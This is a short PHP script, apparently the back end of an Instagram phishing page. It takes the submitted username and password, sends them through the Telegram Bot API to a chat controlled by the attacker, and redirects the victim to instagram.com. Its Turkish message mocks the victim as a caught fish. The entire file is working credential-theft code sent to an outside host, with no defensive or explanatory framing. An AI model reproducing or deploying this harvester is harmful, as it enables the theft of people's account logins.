
<?php
include('tg.php');

if($_POST){
$username= $_POST['username'];

$password=$_POST["password"];
$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Kullanıcı Adı : '.$username.'
Şifre : '.$password.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com/');
}
?>
